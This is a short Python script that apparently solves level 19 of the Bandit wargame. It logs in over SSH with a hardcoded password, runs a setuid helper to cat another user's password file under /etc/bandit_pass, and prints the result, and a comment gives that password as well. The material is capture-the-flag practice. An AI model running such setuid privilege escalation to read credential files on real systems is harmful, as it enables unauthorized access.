import os
import sys
sys.path.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')

import paramiko
import utils

USERNAME = 'bandit19'
PASSWORD = 'IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print('connecting...\n')
client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)

# escalate our privilege to access bandit20 password using the misconfigured setuid binary 
print("./bandit20-do cat /etc/bandit_pass/bandit20")
_, stdout, _ = client.exec_command("./bandit20-do cat /etc/bandit_pass/bandit20")
stdout = stdout.readlines()
utils.print_stdout(stdout)
password = utils.get_password(stdout)

# bandit20 password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
print(f"bandit20 password: {password}")

client.close()